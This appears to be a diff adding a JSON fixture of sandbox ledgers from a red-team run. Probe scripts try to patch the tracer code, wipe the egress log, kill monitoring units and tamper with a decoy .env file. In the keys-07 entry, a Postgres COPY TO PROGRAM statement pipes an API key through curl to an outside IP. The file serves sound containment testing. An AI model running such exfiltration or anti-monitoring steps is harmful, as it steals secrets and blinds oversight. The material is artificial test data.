@@ -1,0 +1,630 @@
+{
+ "_source": "W5 red-team stand run 2026-11-05 19:06-19:10Z on lane/ct0511-fix 1e00f00 (hold-out sha256 0fbff2dd30c9...); ledgers trimmed to the fields the checks read",
+ "ledgers": {
+  "escape-05-patch-tracer-code": {
+   "canaries": [
+    {
+     "evidence": [],
+     "exfil_attempt": false,
+     "id": "api-key-row",
+     "kind": "db_row",
+     "touched": false
+    },
+    {
+     "evidence": [],
+     "exfil_attempt": false,
+     "id": "env-file",
+     "kind": "file",
+     "touched": false
+    },
+    {
+     "evidence": [],
+     "exfil_attempt": false,
+     "id": "purge-url",
+     "kind": "url",
+     "touched": false
+    }
+   ],
+   "dirs": {
+    "created": [],
+    "deleted": [],
+    "modified": []
+   },
+   "dns": [],
+   "egress": [],
+   "egress_denied": {
+    "packets": 1
+   },
+   "exit": 0,
+   "files": {
+    "created": [],
+    "deleted": [],
+    "modified": []
+   },
+   "integrity": {
+    "checks": {
+     "auditd": "not running",
+     "decoy_watch": "unavailable",
+     "egress_recorder": "running",
+     "firewall_rules": "unchanged",
+     "routes": "unchanged",
+     "sandbox": "service",
+     "statement_logging": "unchanged",
+     "tracer_files": "unchanged"
+    },
+    "issues": [],
+    "ok": true
+   },
+   "ip_accounting": {
+    "egress_bytes": 180,
+    "egress_packets": 3,
+    "ingress_bytes": 0,
+    "ingress_packets": 0
+   },
+   "limits": {
+    "mem_max_mb": 256.0,
+    "oom": false,
+    "oom_kills": 0,
+    "peak_mem_mb": 2.5,
+    "pids_limit_hit": 0,
+    "pids_max": 128,
+    "wall_exceeded": false,
+    "wall_max_s": 20.0,
+    "wall_s": 3.107
+   },
+   "out_of_scope": [
+    {
+     "count": 1,
+     "item": "outbound packets",
+     "kind": "network",
+     "op": "denied",
+     "reason": "the script sent packets the sandbox denied (not via the recorder)"
+    }
+   ],
+   "output": {
+    "stderr_tail": "/opt/rt/work/escape-05-patch-tracer-code.sh: line 3: /opt/rt/lib/rt/tracer/diff.py: Read-only file system\n",
+    "stdout_tail": ""
+   },
+   "rows": {},
+   "sql": [],
+   "summary": {
+    "canaries_touched": 0,
+    "egress_attempts": 0,
+    "egress_bytes_delivered": 0,
+    "egress_denied_packets": 1,
+    "egress_out_of_scope": 0,
+    "files_changed": 0,
+    "files_out_of_scope": 0,
+    "out_of_scope_total": 1,
+    "rows_changed": 0,
+    "rows_out_of_scope": 0,
+    "verdict": "out_of_scope"
+   }
+  },
+  "escape-09-wipe-egress-log": {
+   "canaries": [
+    {
+     "evidence": [],
+     "exfil_attempt": false,
+     "id": "api-key-row",
+     "kind": "db_row",
+     "touched": false
+    },
+    {
+     "evidence": [],
+     "exfil_attempt": false,
+     "id": "env-file",
+     "kind": "file",
+     "touched": false
+    },
+    {
+     "evidence": [],
+     "exfil_attempt": false,
+     "id": "purge-url",
+     "kind": "url",
+     "touched": false
+    }
+   ],
+   "dirs": {
+    "created": [],
+    "deleted": [],
+    "modified": []
+   },
+   "dns": [],
+   "egress": [],
+   "egress_denied": {
+    "packets": 1
+   },
+   "exit": 1,
+   "files": {
+    "created": [],
+    "deleted": [],
+    "modified": []
+   },
+   "integrity": {
+    "checks": {
+     "auditd": "not running",
+     "decoy_watch": "unavailable",
+     "egress_recorder": "running",
+     "firewall_rules": "unchanged",
+     "routes": "unchanged",
+     "sandbox": "service",
+     "statement_logging": "unchanged",
+     "tracer_files": "unchanged"
+    },
+    "issues": [],
+    "ok": true
+   },
+   "ip_accounting": {
+    "egress_bytes": 180,
+    "egress_packets": 3,
+    "ingress_bytes": 0,
+    "ingress_packets": 0
+   },
+   "limits": {
+    "mem_max_mb": 256.0,
+    "oom": false,
+    "oom_kills": 0,
+    "peak_mem_mb": 2.2,
+    "pids_limit_hit": 0,
+    "pids_max": 128,
+    "wall_exceeded": false,
+    "wall_max_s": 20.0,
+    "wall_s": 4.128
+   },
+   "out_of_scope": [
+    {
+     "count": 1,
+     "item": "outbound packets",
+     "kind": "network",
+     "op": "denied",
+     "reason": "the script sent packets the sandbox denied (not via the recorder)"
+    }
+   ],
+   "output": {
+    "stderr_tail": "/opt/rt/work/escape-09-wipe-egress-log.sh: line 5: /var/log/rt-egress/egress.jsonl: Read-only file system\n",
+    "stdout_tail": ""
+   },
+   "rows": {},
+   "sql": [],
+   "summary": {
+    "canaries_touched": 0,
+    "egress_attempts": 0,
+    "egress_bytes_delivered": 0,
+    "egress_denied_packets": 1,
+    "egress_out_of_scope": 0,
+    "files_changed": 0,
+    "files_out_of_scope": 0,
+    "out_of_scope_total": 1,
+    "rows_changed": 0,
+    "rows_out_of_scope": 0,
+    "verdict": "out_of_scope"
+   }
+  },
+  "escape-11-kill-every-rt-unit": {
+   "canaries": [
+    {
+     "evidence": [],
+     "exfil_attempt": false,
+     "id": "api-key-row",
+     "kind": "db_row",
+     "touched": false
+    },
+    {
+     "evidence": [],
+     "exfil_attempt": false,
+     "id": "env-file",
+     "kind": "file",
+     "touched": false
+    },
+    {
+     "evidence": [],
+     "exfil_attempt": false,
+     "id": "purge-url",
+     "kind": "url",
+     "touched": false
+    }
+   ],
+   "dirs": {
+    "created": [],
+    "deleted": [],
+    "modified": []
+   },
+   "dns": [],
+   "egress": [],
+   "egress_denied": {
+    "packets": 1
+   },
+   "exit": 0,
+   "files": {
+    "created": [],
+    "deleted": [],
+    "modified": []
+   },
+   "integrity": {
+    "checks": {
+     "auditd": "not running",
+     "decoy_watch": "unavailable",
+     "egress_recorder": "running",
+     "firewall_rules": "unchanged",
+     "routes": "unchanged",
+     "sandbox": "service",
+     "statement_logging": "unchanged",
+     "tracer_files": "unchanged"
+    },
+    "issues": [],
+    "ok": true
+   },
+   "ip_accounting": {
+    "egress_bytes": 180,
+    "egress_packets": 3,
+    "ingress_bytes": 0,
+    "ingress_packets": 0
+   },
+   "limits": {
+    "mem_max_mb": 256.0,
+    "oom": false,
+    "oom_kills": 0,
+    "peak_mem_mb": 3.2,
+    "pids_limit_hit": 0,
+    "pids_max": 128,
+    "wall_exceeded": false,
+    "wall_max_s": 20.0,
+    "wall_s": 3.157
+   },
+   "out_of_scope": [
+    {
+     "count": 1,
+     "item": "outbound packets",
+     "kind": "network",
+     "op": "denied",
+     "reason": "the script sent packets the sandbox denied (not via the recorder)"
+    }
+   ],
+   "output": {
+    "stderr_tail": "Failed to connect to bus: Connection refused\n",
+    "stdout_tail": ""
+   },
+   "rows": {},
+   "sql": [],
+   "summary": {
+    "canaries_touched": 0,
+    "egress_attempts": 0,
+    "egress_bytes_delivered": 0,
+    "egress_denied_packets": 1,
+    "egress_out_of_scope": 0,
+    "files_changed": 0,
+    "files_out_of_scope": 0,
+    "out_of_scope_total": 1,
+    "rows_changed": 0,
+    "rows_out_of_scope": 0,
+    "verdict": "out_of_scope"
+   }
+  },
+  "injection-06-benign-classification-string": {
+   "canaries": [
+    {
+     "evidence": [],
+     "exfil_attempt": false,
+     "id": "api-key-row",
+     "kind": "db_row",
+     "touched": false
+    },
+    {
+     "evidence": [
+      "modified"
+     ],
+     "exfil_attempt": false,
+     "id": "env-file",
+     "kind": "file",
+     "touched": true
+    },
+    {
+     "evidence": [],
+     "exfil_attempt": false,
+     "id": "purge-url",
+     "kind": "url",
+     "touched": false
+    }
+   ],
+   "dirs": {
+    "created": [],
+    "deleted": [],
+    "modified": []
+   },
+   "dns": [],
+   "egress": [],
+   "egress_denied": {
+    "packets": 1
+   },
+   "exit": 0,
+   "files": {
+    "created": [],
+    "deleted": [],
+    "modified": [
+     "/srv/app/.env.canary"
+    ]
+   },
+   "integrity": {
+    "checks": {
+     "auditd": "not running",
+     "decoy_watch": "unavailable",
+     "egress_recorder": "running",
+     "firewall_rules": "unchanged",
+     "routes": "unchanged",
+     "sandbox": "service",
+     "statement_logging": "unchanged",
+     "tracer_files": "unchanged"
+    },
+    "issues": [],
+    "ok": true
+   },
+   "ip_accounting": {
+    "egress_bytes": 180,
+    "egress_packets": 3,
+    "ingress_bytes": 0,
+    "ingress_packets": 0
+   },
+   "limits": {
+    "mem_max_mb": 256.0,
+    "oom": false,
+    "oom_kills": 0,
+    "peak_mem_mb": 2.1,
+    "pids_limit_hit": 0,
+    "pids_max": 128,
+    "wall_exceeded": false,
+    "wall_max_s": 20.0,
+    "wall_s": 3.101
+   },
+   "out_of_scope": [
+    {
+     "count": 1,
+     "item": "outbound packets",
+     "kind": "network",
+     "op": "denied",
+     "reason": "the script sent packets the sandbox denied (not via the recorder)"
+    },
+    {
+     "item": "/srv/app/.env.canary",
+     "kind": "path",
+     "op": "modified",
+     "reason": "not under declared paths (/srv/app/tmp)"
+    },
+    {
+     "item": "env-file",
+     "kind": "canary",
+     "op": "modified",
+     "reason": "decoy touched"
+    }
+   ],
+   "output": {
+    "stderr_tail": "",
+    "stdout_tail": ""
+   },
+   "rows": {},
+   "sql": [],
+   "summary": {
+    "canaries_touched": 1,
+    "egress_attempts": 0,
+    "egress_bytes_delivered": 0,
+    "egress_denied_packets": 1,
+    "egress_out_of_scope": 0,
+    "files_changed": 1,
+    "files_out_of_scope": 1,
+    "out_of_scope_total": 3,
+    "rows_changed": 0,
+    "rows_out_of_scope": 0,
+    "verdict": "out_of_scope"
+   }
+  },
+  "keys-07-postgres-copy-program": {
+   "canaries": [
+    {
+     "evidence": [
+      "sql"
+     ],
+     "exfil_attempt": false,
+     "id": "api-key-row",
+     "kind": "db_row",
+     "touched": true
+    },
+    {
+     "evidence": [],
+     "exfil_attempt": false,
+     "id": "env-file",
+     "kind": "file",
+     "touched": false
+    },
+    {
+     "evidence": [],
+     "exfil_attempt": false,
+     "id": "purge-url",
+     "kind": "url",
+     "touched": false
+    }
+   ],
+   "dirs": {
+    "created": [],
+    "deleted": [],
+    "modified": []
+   },
+   "dns": [],
+   "egress": [],
+   "egress_denied": {
+    "packets": 0
+   },
+   "exit": 1,
+   "files": {
+    "created": [],
+    "deleted": [],
+    "modified": []
+   },
+   "integrity": {
+    "checks": {
+     "auditd": "not running",
+     "decoy_watch": "unavailable",
+     "egress_recorder": "running",
+     "firewall_rules": "unchanged",
+     "routes": "unchanged",
+     "sandbox": "service",
+     "statement_logging": "unchanged",
+     "tracer_files": "unchanged"
+    },
+    "issues": [],
+    "ok": true
+   },
+   "ip_accounting": {
+    "egress_bytes": 0,
+    "egress_packets": 0,
+    "ingress_bytes": 0,
+    "ingress_packets": 0
+   },
+   "limits": {
+    "mem_max_mb": 256.0,
+    "oom": false,
+    "oom_kills": 0,
+    "peak_mem_mb": 4.8,
+    "pids_limit_hit": 0,
+    "pids_max": 128,
+    "wall_exceeded": false,
+    "wall_max_s": 20.0,
+    "wall_s": 0.128
+   },
+   "out_of_scope": [
+    {
+     "item": "api-key-row",
+     "kind": "canary",
+     "op": "sql",
+     "reason": "decoy touched"
+    }
+   ],
+   "output": {
+    "stderr_tail": "ERROR:  permission denied to COPY to or from an external program\nDETAIL:  Only roles with privileges of the \"pg_execute_server_program\" role may COPY to or from an external program.\nHINT:  Anyone can COPY to stdout or from stdin. psql's \\copy command also works for anyone.\n",
+    "stdout_tail": ""
+   },
+   "rows": {},
+   "sql": [
+    {
+     "app": "psql",
+     "db": "shop",
+     "error": "permission denied to COPY to or from an external program",
+     "statement": "COPY (SELECT key FROM api_keys WHERE id = 9001) TO PROGRAM 'curl -s -m 5 --data-binary @- http://10.213.77.10:8080/pg'",
+     "user": "shop"
+    }
+   ],
+   "summary": {
+    "canaries_touched": 1,
+    "egress_attempts": 0,
+    "egress_bytes_delivered": 0,
+    "egress_denied_packets": 0,
+    "egress_out_of_scope": 0,
+    "files_changed": 0,
+    "files_out_of_scope": 0,
+    "out_of_scope_total": 1,
+    "rows_changed": 0,
+    "rows_out_of_scope": 0,
+    "verdict": "out_of_scope"
+   }
+  },
+  "network-09-https-resolve-override": {
+   "canaries": [
+    {
+     "evidence": [],
+     "exfil_attempt": false,
+     "id": "api-key-row",
+     "kind": "db_row",
+     "touched": false
+    },
+    {
+     "evidence": [],
+     "exfil_attempt": false,
+     "id": "env-file",
+     "kind": "file",
+     "touched": false
+    },
+    {
+     "evidence": [],
+     "exfil_attempt": false,
+     "id": "purge-url",
+     "kind": "url",
+     "touched": false
+    }
+   ],
+   "dirs": {
+    "created": [],
+    "deleted": [],
+    "modified": []
+   },
+   "dns": [],
+   "egress": [],
+   "egress_denied": {
+    "packets": 1
+   },
+   "exit": 0,
+   "files": {
+    "created": [],
+    "deleted": [],
+    "modified": []
+   },
+   "integrity": {
+    "checks": {
+     "auditd": "not running",
+     "decoy_watch": "unavailable",
+     "egress_recorder": "running",
+     "firewall_rules": "unchanged",
+     "routes": "unchanged",
+     "sandbox": "service",
+     "statement_logging": "unchanged",
+     "tracer_files": "unchanged"
+    },
+    "issues": [],
+    "ok": true
+   },
+   "ip_accounting": {
+    "egress_bytes": 300,
+    "egress_packets": 5,
+    "ingress_bytes": 0,
+    "ingress_packets": 0
+   },
+   "limits": {
+    "mem_max_mb": 256.0,
+    "oom": false,
+    "oom_kills": 0,
+    "peak_mem_mb": 2.1,
+    "pids_limit_hit": 0,
+    "pids_max": 128,
+    "wall_exceeded": false,
+    "wall_max_s": 20.0,
+    "wall_s": 5.118
+   },
+   "out_of_scope": [
+    {
+     "count": 1,
+     "item": "outbound packets",
+     "kind": "network",
+     "op": "denied",
+     "reason": "the script sent packets the sandbox denied (not via the recorder)"
+    }
+   ],
+   "output": {
+    "stderr_tail": "",
+    "stdout_tail": ""
+   },
+   "rows": {},
+   "sql": [],
+   "summary": {
+    "canaries_touched": 0,
+    "egress_attempts": 0,
+    "egress_bytes_delivered": 0,
+    "egress_denied_packets": 1,
+    "egress_out_of_scope": 0,
+    "files_changed": 0,
+    "files_out_of_scope": 0,
+    "out_of_scope_total": 1,
+    "rows_changed": 0,
+    "rows_out_of_scope": 0,
+    "verdict": "out_of_scope"
+   }
+  }
+ }
+}
